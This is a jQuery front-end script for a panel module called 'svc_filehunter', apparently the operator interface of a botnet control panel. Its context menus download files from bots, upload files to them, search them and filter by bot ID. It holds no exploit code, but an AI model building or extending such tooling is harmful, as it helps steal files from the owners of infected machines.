$(function(){
	switch ($('html').attr('lang')){
		case 'ru':
			window.lexicon = {
				'download': 'Скачать',
				'upload': 'Закачать',
				//'rescan': 'Перезапустить поиск',
				'bot': 'Файлы этого бота',
				'search': 'Поиск...',
				'junk': 'Hide file',
				'junkbot': 'Hide all bot files'
				};
			break;
		default: // english fallback
			window.lexicon = {
				'download': 'Download',
				'upload': 'Upload',
				//'rescan': 'Restart search',
				'bot': 'This bot files',
				'search': 'Search...',
				'junk': 'Скрыть файл',
				'junkbot': 'Скрыть все файлы бота'
				};
			break;
		}

	var ajax_reload_tables = function(){
		$.get(window.location, function(data){
			$doc = $(data);
			$('#recent_scripts').replaceWith($doc.find('#recent_scripts'));
			$('#hunted_files').replaceWith($doc.find('#hunted_files'));
			});
		};

	$.contextMenu(window.AJAXcontextMenu({
		lexicon: window.lexicon,
		selector: '#hunted_files TBODY tr *',
		callback: function(key, opt, ajaxSuccess){
			var $tr = $(this).closest('tr');
			var target = window.location + $tr.data('href');
			var complete = function(data){
				ajaxSuccess.apply(data);
				ajax_reload_tables();
				};
			$.get( target, {'ajax': key}, complete );
			return true;
			},
		items: {
			'download':	{
				ajaxSuccess: function(data){}
				},
			'upload': {
				callback: function(key, opt){
					var $tr = $(this).closest('tr');
					var botid = $tr.find('th').text();
					var filename = $tr.find('td.file').text();
					var target = window.location + $tr.data('href') + '&ajax=upload';

					var $form = $('#fileupload').clone().show();
					$form.find('form dt.file').text( filename );
					$form.find('form dt.botId').text( botid );
					$form.find('form').attr('action', target);

					$.colorbox({html: $form});
					}
				},
			'search':	{
				callback: function(key, opt){
					var $tr = $(this).closest('tr');
					var botid = $tr.find('th').text();
					var target = window.location + $tr.data('href') + '&ajax=search';

					var $form = $('#filesearch').clone().show();
					$form.find('form dt.botId').text( botid );
					$form.find('form').attr('action', target);

					$.colorbox({html: $form});
					}
				},
			'junk': { ajaxSuccess: function(data){} },
			'junkbot': { ajaxSuccess: function(data){} },
			'bot': { callback: function(key,opt){
				var $tr = $(this).closest('tr');
				var botid = $tr.find('th').text();
				window.location = '?m=svc_filehunter&filter[]=botId:'+botid;
				} }
			}
		}));

	// Notes
	$('#hunted_files TBODY .notes').blur(function(){
		var $this = $(this);
		$this.animate({'background-color': '#F99'}, 200);

		var target = window.location + $this.data('href') + '&ajax=notes';
		$.post( target, {'notes': $this.html()}, function(){
			$this.animate({'background-color': 'transparent'}, 1000);
			});
		});

	// jPager3k
	$(function(){  $('.paginator').jPager3k('auto', {lang: $('html').attr('lang')});  });

	// COllapsible scripts
	var $scripts = $('#scripts-collapsible');
	$scripts.closest('table').find('tr:eq(0)').click(function(){
		$scripts.toggle();
		});

	// Search
	$('#hunted_files_search').submit(function(){
		var $this = $(this);
		window.location = $this.attr('action') + '&filter[]=search:' + $this.find('input:text').val();
		return false;
		});
	});
